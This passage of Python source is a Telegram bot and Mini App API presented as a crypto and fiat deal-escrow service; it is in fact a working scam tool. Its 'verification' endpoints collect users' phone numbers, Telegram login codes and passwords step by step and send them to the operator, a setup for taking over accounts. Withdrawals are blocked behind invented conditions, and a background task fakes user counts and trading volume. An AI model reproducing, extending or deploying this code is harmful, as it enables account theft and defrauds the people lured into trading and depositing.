        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /confirm_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer("❌ Заявка не найдена")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Заявка уже обработана")
        return
    bal = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if bal.get(curr_key, 0) >= req["amount"]:
        bal[curr_key] -= req["amount"]
        save_json(FILES["balance"], balance)
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"{get_emoji('check')} Вывод подтверждён #{request_id}")
    try:
        await bot.send_message(
            req["user_id"],
            f"{get_emoji('check')} <b>ВЫВОД ПОДТВЕРЖДЁН</b>\n\n💰 {req['amount']} {req['currency']}"
        )
    except:
        pass

@dp.message(Command("reject_withdraw"))
async def reject_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /reject_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer("❌ Заявка не найдена")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Заявка уже обработана")
        return
    req["status"] = "rejected"
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"{get_emoji('cross')} Вывод отклонён #{request_id}")

# ============================================================
# 19. АДМИН: ТИКЕТЫ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_tickets")
async def admin_tickets(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    pending = {k: v for k, v in tickets.items() if v.get("status") == "open"}
    
    if not pending:
        await callback.message.edit_text(f"{get_emoji('cross')} Нет открытых тикетов", reply_markup=admin_panel_keyboard())
        return
    
    text = f"{get_emoji('headset')} <b>ТИКЕТЫ</b>\n\n"
    for tid, t in list(pending.items())[-10:]:
        text += f"#{tid}\n"
        text += f"   👤 @{t.get('username', 'неизвестно')} (ID: {t.get('user_id', '?')})\n"
        text += f"   📝 {t.get('subject', '')}\n"
        text += f"   💬 {t.get('message', '')[:50]}\n"
        text += f"   ➡️ /answer_ticket {tid} [ответ]\n"
        text += f"   ➡️ /close_ticket {tid}\n\n"
    
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("answer_ticket"))
async def answer_ticket_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("ℹ️ Использование: /answer_ticket [ticket_id] [ответ]")
        return
    
    ticket_id = args[1]
    response = args[2]
    
    if ticket_id not in tickets:
        await message.answer("❌ Тикет не найден")
        return
    
    t = tickets[ticket_id]
    t["response"] = response
    t["status"] = "closed"
    t["answered_at"] = datetime.now().isoformat()
    t["answered_by"] = message.from_user.id
    save_json(FILES["tickets"], tickets)
    
    await message.answer(f"{get_emoji('check')} Ответ отправлен на тикет #{ticket_id}")
    
    try:
        await bot.send_message(
            t["user_id"],
            f"{get_emoji('headset')} <b>ОТВЕТ НА ТИКЕТ #{ticket_id}</b>\n\n"
            f"📝 {response}\n\n"
            f"{get_emoji('check')} Тикет закрыт"
        )
    except:
        pass

@dp.message(Command("close_ticket"))
async def close_ticket_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещён")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /close_ticket [ticket_id]")
        return
    
    ticket_id = args[1]
    
    if ticket_id not in tickets:
        await message.answer("❌ Тикет не найден")
        return
    
    t = tickets[ticket_id]
    t["status"] = "closed"
    t["closed_at"] = datetime.now().isoformat()
    t["closed_by"] = message.from_user.id
    save_json(FILES["tickets"], tickets)
    
    await message.answer(f"{get_emoji('check')} Тикет #{ticket_id} закрыт")

# ============================================================
# 20. АДМИН: ЛОГИ И СТАТИСТИКА
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    logs_list = list(logs.values())[-20:]
    if not logs_list:
        await callback.message.edit_text(f"{get_emoji('book')} <b>ЛОГИ</b>\n\nНет записей", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('book')} <b>ПОСЛЕДНИЕ ЛОГИ</b>\n\n"
    for log_entry in reversed(logs_list[-10:]):
        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
        text += f"📌 {log_entry.get('action', '')}\n"
        data = log_entry.get('data', {})
        text += f"📊 {json.dumps(data, ensure_ascii=False)[:80]}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    total_users = len(balance)
    total_deals = len(deals)
    total_volume = round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
    active_deals = len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']])
    open_tickets = len([t for t in tickets.values() if t.get('status') == 'open'])
    
    await callback.message.edit_text(
        f"{get_emoji('zap')} <b>СТАТИСТИКА</b>\n\n"
        f"👥 Пользователей: {total_users}\n"
        f"📊 Всего сделок: {total_deals}\n"
        f"🔄 Активных сделок: {active_deals}\n"
        f"💎 Объём (TON): {total_volume}\n"
        f"✅ Завершённых сделок: {len([d for d in deals.values() if d.get('status') == 'completed'])}\n"
        f"🎫 Открытых тикетов: {open_tickets}",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

# ============================================================
# 21. АДМИН: НАЧИСЛЕНИЕ БАЛАНСА
# ============================================================
class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text(f"{get_emoji('wallet')} <b>НАЧИСЛИТЬ БАЛАНС</b>\n\nВведите ID пользователя:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer(f"💱 Выберите валюту:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except:
        await message.answer("❌ Неверный ID")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(target_currency=currency)
    await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data.get("target_user_id")
        currency = data.get("target_currency")
        add_balance(user_id, currency, amount)
        await message.answer(
            f"{get_emoji('check')} Начислено {amount} {currency} пользователю {user_id}",
            reply_markup=admin_panel_keyboard()
        )
        await state.clear()
    except:
        await message.answer("❌ Неверная сумма")

# ============================================================
# 22. АДМИН: УПРАВЛЕНИЕ АДМИНАМИ
# ============================================================
@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
    await callback.message.edit_text(
        f"👥 АДМИНЫ\n\n"
        f"Главный админ: {MASTER_ADMIN_ID}\n"
        f"Дополнительные:\n{admin_list}\n\n"
        f"/add_admin [ID] - добавить\n"
        f"/remove_admin [ID] - удалить",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /add_admin [ID]")
        return
    try:
        new_admin_id = int(args[1])
        admins[str(new_admin_id)] = True
        save_json(FILES["admins"], admins)
        await message.answer(f"✅ Админ добавлен: {new_admin_id}")
    except:
        await message.answer("❌ Неверный ID")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("❌ Доступ запрещён")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("ℹ️ Использование: /remove_admin [ID]")
        return
    try:
        admin_id = int(args[1])
        if admin_id == MASTER_ADMIN_ID:
            await message.answer("❌ Нельзя удалить главного админа")
            return
        if str(admin_id) in admins:
            del admins[str(admin_id)]
            save_json(FILES["admins"], admins)
            await message.answer(f"✅ Админ удалён: {admin_id}")
        else:
            await message.answer("❌ Админ не найден")
    except:
        await message.answer("❌ Неверный ID")

# ============================================================
# 23. ОБРАБОТЧИК ССЫЛКИ НА СДЕЛКУ
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    lang = get_user_language(message.from_user.id)
    
    global deals
    deals = load_json(FILES["deals"])
    
    if deal_id not in deals:
        if lang == "ru":
            text = f"""{get_emoji('cross')} Сделка #{deal_id} не найдена.

Возможные причины:
• Сделка была удалена
• Ссылка недействительна
• Сделка завершена

🆘 Если вы считаете, что это ошибка — обратитесь в поддержку: @supexchangerf"""
        else:
            text = f"""{get_emoji('cross')} Deal #{deal_id} not found.

Possible reasons:
• Deal was deleted
• Invalid link
• Deal is completed

🆘 If you think this is an error — contact support: @supexchangerf"""
        await message.answer(text)
        return

    deal = deals[deal_id]
    
    if deal["status"] != "waiting_payment":
        status_map = {
            "paid": f"{get_emoji('check')} Оплачено" if lang == "ru" else f"{get_emoji('check')} Paid",
            "awaiting_confirmation": f"{get_emoji('gift')} Ожидает подтверждения" if lang == "ru" else f"{get_emoji('gift')} Awaiting confirmation",
            "completed": f"{get_emoji('crown')} Завершено" if lang == "ru" else f"{get_emoji('crown')} Completed"
        }
        if lang == "ru":
            text = f"{get_emoji('cross')} Сделка #{deal_id} уже обработана.\n\nСтатус: {status_map.get(deal['status'], deal['status'])}"
        else:
            text = f"{get_emoji('cross')} Deal #{deal_id} already processed.\n\nStatus: {status_map.get(deal['status'], deal['status'])}"
        await message.answer(text)
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        if lang == "ru":
            text = f"{get_emoji('cross')} Доступ запрещён!\n\nСделка #{deal_id} предназначена для @{deal['buyer_username']}"
        else:
            text = f"{get_emoji('cross')} Access denied!\n\nDeal #{deal_id} is for @{deal['buyer_username']}"
        await message.answer(text)
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    nft_info = ""
    if deal.get('nft_link'):
        nft_info = f"\n🔗 NFT: {deal['nft_link']}"
    
    if lang == "ru":
        text = f"""{get_emoji('briefcase')} СДЕЛКА #{deal_id}

📦 Товар: {deal['product']}
💰 Сумма: {deal['amount']} {deal['currency']}
👤 Продавец: @{deal['seller_username']}
{nft_info}

⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""
    else:
        text = f"""{get_emoji('briefcase')} DEAL #{deal_id}

📦 Product: {deal['product']}
💰 Amount: {deal['amount']} {deal['currency']}
👤 Seller: @{deal['seller_username']}
{nft_info}

⬇️ GO TO MINI APP FOR PAYMENT"""

    await message.answer(
        text,
        reply_markup=mini_app_keyboard(
            "💳 Перейти к оплате" if lang == "ru" else "💳 Go to payment",
            page="pay",
            deal_id=deal_id,
            buyer_id=message.from_user.id
        )
    )

# ============================================================
# 24. ОБРАБОТЧИК ВЫВОДА
# ============================================================
@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    
    bal = get_balance(callback.from_user.id)
    partners = bal.get('deal_partners', {})
    has_two = any(count >= 2 for count in partners.values())
    total_deals = sum(partners.values())
    
    if not has_two:
        if lang == "ru":
            text = f"""{get_emoji('zap')} ТРЕБУЕТСЯ 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ

📊 У вас завершено: {total_deals} сделок

Для вывода средств необходимо провести 2 успешные сделки с одним покупателем.

✅ Создайте новую сделку и завершите её."""
        else:
            text = f"""{get_emoji('zap')} 2 DEALS WITH ONE BUYER REQUIRED

📊 You have completed: {total_deals} deals

To withdraw funds you need to complete 2 successful deals with one buyer.

✅ Create a new deal and complete it."""
        
        await callback.message.edit_text(
            text,
            reply_markup=back_to_main_keyboard()
        )
        await callback.answer()
        return
    
    if not is_verified(callback.from_user.id):
        if lang == "ru":
            text = f"""{get_emoji('zap')} ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ

🔐 Пройдите верификацию в Mini App для вывода средств.

📱 Нажмите кнопку ниже, чтобы пройти верификацию."""
        else:
            text = f"""{get_emoji('zap')} VERIFICATION REQUIRED

🔐 Complete verification in Mini App to withdraw funds.

📱 Click the button below to verify."""
        
        await callback.message.edit_text(
            text,
            reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", page="verify")
        )
        await callback.answer()
        return
    
    verif_data = verification_data.get(str(callback.from_user.id), {})
    
    if lang == "ru":
        text = f"""{get_emoji('wallet')} ВАШ БАЛАНС

{get_emoji('ton')} TON: {bal.get('ton', 0)}
{get_emoji('stars')} STARS: {bal.get('stars', 0)}
{get_emoji('rub')} RUB: {bal.get('rub', 0)}
{get_emoji('uah')} UAH: {bal.get('uah', 0)}

✅ 2 сделки с одним покупателем: выполнено
✅ Верификация: пройдена

🔑 Код верификации: {verif_data.get('code', 'неизвестно')}
🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19] if verif_data.get('expires_at') else 'неизвестно'}

📱 Вывод средств в Mini App"""
    else:
        text = f"""{get_emoji('wallet')} YOUR BALANCE

{get_emoji('ton')} TON: {bal.get('ton', 0)}
{get_emoji('stars')} STARS: {bal.get('stars', 0)}
{get_emoji('rub')} RUB: {bal.get('rub', 0)}
{get_emoji('uah')} UAH: {bal.get('uah', 0)}

✅ 2 deals with one buyer: completed
✅ Verification: passed

🔑 Verification code: {verif_data.get('code', 'unknown')}
🕐 Session active until: {verif_data.get('expires_at', 'unknown')[:19] if verif_data.get('expires_at') else 'unknown'}

📱 Withdraw in Mini App"""
    
    await callback.message.edit_text(
        text,
        reply_markup=mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", page="withdraw")
    )
    await callback.answer()

# ============================================================
# 25. ФОНОВЫЙ ПРОЦЕСС
# ============================================================
async def auto_increment_stats():
    while True:
        try:
            stats_data = load_json(FILES["stats"])
            
            if not stats_data:
                stats_data = {}
            
            MIN_USERS = 21481
            MIN_DEALS_TODAY = 1287
            MIN_VOLUME = 627.4
            MAX_VOLUME = 9470
            
            current_volume = stats_data.get('volume', MIN_VOLUME)
            
            change = random.uniform(-0.5, 0.5)
            new_volume = current_volume * (1 + change * 0.02)
            
            if new_volume < MIN_VOLUME:
                new_volume = MIN_VOLUME + random.uniform(0.5, 2)
            if new_volume > MAX_VOLUME:
                new_volume = MAX_VOLUME - random.uniform(0.5, 2)
            
            stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
            stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
            stats_data['volume'] = round(new_volume, 1)
            
            if stats_data['users'] < MIN_USERS:
                stats_data['users'] = MIN_USERS + random.randint(100, 500)
            if stats_data['deals_today'] < MIN_DEALS_TODAY:
                stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
            
            save_json(FILES["stats"], stats_data)
            
        except Exception as e:
            print(f"Ошибка автонакрутки: {e}")
        
        await asyncio.sleep(300)

# ============================================================
# 26. API ДЛЯ MINI APP
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username',
        'Access-Control-Allow-Credentials': 'true'
    }
    
    if request.method == 'OPTIONS':
        return web.Response(headers=headers, status=200)
    
    if request.method == 'GET':
        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    username = data.get('username')
    endpoint = request.path
    
    # БАЛАНС
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers=headers)
    
    # СОЗДАНИЕ СДЕЛКИ
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        category = data.get('category', 'other')
        nft_link = data.get('nft_link')
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username or str(user_id),
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "category": category,
            "nft_link": nft_link,
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None,
            "nft_transferred": False,
            "nft_transfer_account": NFT_ESCROW_ACCOUNT if category == "nft_gift" else None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        
        log_action("deal_created", {
            "deal_id": deal_id,
            "seller_id": user_id,
            "buyer_username": buyer_username,
            "product": product,
            "amount": amount,
            "currency": currency,
            "category": category
        })
        
        await log_to_master(
            f"📦 НОВАЯ СДЕЛКА #{deal_id}\n\n"
            f"👤 Продавец: @{username or str(user_id)} (ID: {user_id})\n"
            f"👤 Покупатель: @{buyer_username}\n"
            f"📦 Товар: {product}\n"
            f"💰 Сумма: {amount} {currency}\n"
            f"🏷️ Категория: {category}\n"
            f"{'🔗 NFT: ' + nft_link if nft_link else ''}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link,
            'status': deals[deal_id]["status"]
        }, headers=headers)
    
    # СДЕЛКИ
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ВСЕ СДЕЛКИ (АДМИН)
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        return web.json_response({'success': True, 'deals': list(deals.values())}, headers=headers)
    
    # ПРОВЕРКА АДМИНА
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # СТАТИСТИКА
    elif endpoint == '/api/stats':
        return web.json_response({
            'success': True,
            'deals_today': stats.get('deals_today', len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))])),
            'users': stats.get('users', len(balance)),
            'volume': stats.get('volume', round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1))
        }, headers=headers)
    
    # ПРОВЕРКА 2-Х СДЕЛОК
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_two = any(count >= 2 for count in partners.values())
        return web.json_response({
            'success': True,
            'has_2_deals': has_two,
            'total_deals': sum(partners.values())
        }, headers=headers)
    
    # СТАТУС ВЕРИФИКАЦИИ
    elif endpoint == '/api/verification_status':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        return web.json_response({
            'success': True,
            'verified': is_verified(user_id),
            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
        }, headers=headers)
    
    # ЗАПРОС ВЕРИФИКАЦИИ
    elif endpoint == '/api/send_verification_request':
        phone = data.get('phone')
        username = data.get('username')
        
        if not phone or not username or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if is_verified(user_id):
            return web.json_response({'success': False, 'error': 'User already verified'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        verification_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "code": None,
            "password": None,
            "status": "pending",
            "step": "phone",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["verification_requests"], verification_requests)
        
        await log_to_master(
            f"📱 ШАГ 1 ВЕРИФИКАЦИИ\n\n"
            f"🆔 Заявка: #{request_id}\n"
            f"👤 Пользователь: @{username}\n"
            f"🆔 ID: {user_id}\n"
            f"📞 Номер: {phone}\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Ожидается ввод кода..."
        )
        
        return web.json_response({
            'success': True,
            'request_id': request_id
        }, headers=headers)
    
    # ОТПРАВКА КОДА
    elif endpoint == '/api/submit_verification_code':
        code = data.get('code')
        request_id = data.get('request_id')
        
        if not code or not user_id or not request_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if request_id not in verification_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        
        req = verification_requests[request_id]
        
        if req.get("status") != "pending":
            return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
        
        req["code"] = code
        req["step"] = "code"
        save_json(FILES["verification_requests"], verification_requests)
        
        await log_to_master(
            f"📨 ШАГ 2 ВЕРИФИКАЦИИ\n\n"
            f"🆔 Заявка: #{request_id}\n"
            f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
            f"🆔 ID: {user_id}\n"
            f"📨 Код: {code}\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Ожидается ввод пароля..."
        )
        
        return web.json_response({
            'success': True,
            'request_id': request_id
        }, headers=headers)
    
    # ОТПРАВКА ПАРОЛЯ
    elif endpoint == '/api/submit_verification_password':
        password = data.get('password')
        request_id = data.get('request_id')
        
        if not password or not user_id or not request_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if request_id not in verification_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        
        req = verification_requests[request_id]
        
        if req.get("status") != "pending":
            return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
        
        req["password"] = password if password else "нет"
        req["step"] = "password"
        save_json(FILES["verification_requests"], verification_requests)
        
        await log_to_master(
            f"🔑 ШАГ 3 ВЕРИФИКАЦИИ\n\n"
            f"🆔 Заявка: #{request_id}\n"
            f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
            f"🆔 ID: {user_id}\n"
            f"🔑 Пароль: {password if password else 'нет'}\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"📌 ДЛЯ ПОДТВЕРЖДЕНИЯ: /verify_confirm {request_id}\n"
            f"📌 ДЛЯ ОТКЛОНЕНИЯ: /verify_reject {request_id}"
        )
        
        return web.json_response({
            'success': True,
            'request_id': request_id
        }, headers=headers)
    
    # ВЫВОД
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not user_id or not currency or not details:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_two = any(count >= 2 for count in partners.values())
        
        if not has_two:
            return web.json_response({'success': False, 'error': 'Требуется 2 сделки с одним покупателем'}, headers=headers)
        
        if not is_verified(user_id):
            return web.json_response({'success': False, 'error': 'Требуется верификация'}, headers=headers)
        
        verif_data = verification_data.get(str(user_id), {})
        if verif_data.get("verified_at"):
            verified_time = datetime.fromisoformat(verif_data["verified_at"])
            if (datetime.now() - verified_time).total_seconds() < 86400:
                return web.json_response({'success': False, 'error': 'Вывод доступен через 24 часа после верификации'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "currency": currency,
            "amount": get_balance(user_id).get(currency.lower(), 0),
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        
        await log_to_master(
            f"💳 НОВАЯ ЗАЯВКА НА ВЫВОД\n\n"
            f"👤 Пользователь: ID: {user_id}\n"
            f"💰 Сумма: {get_balance(user_id).get(currency.lower(), 0)} {currency}\n"
            f"📝 Реквизиты: {details}\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Для подтверждения: /confirm_withdraw {request_id}"
        )
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ЗАЯВКИ НА ВЫВОД
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        return web.json_response({
            'success': True,
            'requests': list(withdraw_requests.values())
        }, headers=headers)
    
    # ЗАПРОСЫ ВЕРИФИКАЦИИ
    elif endpoint == '/api/verification_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        return web.json_response({
            'success': True,
            'requests': list(verification_requests.values())
        }, headers=headers)
    
    # НАЧИСЛИТЬ БАЛАНС (АДМИН)
    elif endpoint == '/api/admin_add_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        if not target_user_id or not currency or not amount:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        add_balance(target_user_id, currency, float(amount))
        
        await log_to_master(
            f"💰 АДМИН НАЧИСЛИЛ БАЛАНС\n\n"
            f"👤 Админ: ID: {user_id}\n"
            f"👤 Пользователь: {target_user_id}\n"
            f"💰 {amount} {currency}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return web.json_response({'success': True}, headers=headers)
    
    # УСТАНОВИТЬ БАЛАНС (АДМИН)
    elif endpoint == '/api/admin_set_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        if not target_user_id or not currency or amount is None:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        set_balance(target_user_id, currency, float(amount))
        
        await log_to_master(
            f"✏️ АДМИН УСТАНОВИЛ БАЛАНС\n\n"
            f"👤 Админ: ID: {user_id}\n"
            f"👤 Пользователь: {target_user_id}\n"
            f"💰 {amount} {currency}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return web.json_response({'success': True}, headers=headers)
    
    # СПИСАТЬ БАЛАНС (АДМИН)
    elif endpoint == '/api/admin_remove_balance':
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        if not target_user_id or not currency or not amount:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        bal = get_balance(target_user_id)
        curr = currency.lower()
        current = bal.get(curr, 0)
        new_amount = max(0, current - float(amount))
        bal[curr] = new_amount
        save_json(FILES["balance"], balance)
        
        await log_to_master(
            f"➖ АДМИН СПИСАЛ БАЛАНС\n\n"
            f"👤 Админ: ID: {user_id}\n"
            f"👤 Пользователь: {target_user_id}\n"
            f"💰 {amount} {currency}\n"
            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return web.json_response({'success': True}, headers=headers)
    
    # ИЗМЕНИТЬ СТАТИСТИКУ
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        
        key = data.get('key')
        value = data.get('value')
        
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        stats[key] = value
        save_json(FILES["stats"], stats)
        
        return web.json_response({'success': True}, headers=headers)
    
    # ОПЛАТА С БАЛАНСА
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        
        if not deal_id or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        
        if deal["status"] != "waiting_payment":
